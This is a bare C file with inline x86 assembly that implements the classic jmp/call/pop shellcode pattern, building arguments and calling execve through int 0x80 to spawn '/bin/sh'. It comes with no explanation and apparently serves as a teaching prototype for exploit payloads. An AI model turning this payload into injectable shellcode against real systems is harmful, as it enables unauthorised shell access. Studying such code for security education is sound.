main() {
__asm__(
     "       jmp    mcall          \n\t"
     "ajmp:  pop    %ebx           \n\t"
     "       mov    $0x0, %eax     \n\t"
     "       mov    %al,0x7(%ebx)  \n\t"
     "       mov    %ebx,0x8(%ebx) \n\t"
     "       mov    %eax,0xc(%ebx) \n\t"
     "       mov    $0xb,%eax      \n\t"
     "       lea    0x8(%ebx),%ecx \n\t"
     "       lea    0xc(%ebx),%edx \n\t"
     "       int    $0x80          \n\t"
     "mcall: call   ajmp           \n\t"
     "       .string \"/bin/sh\""
);
}
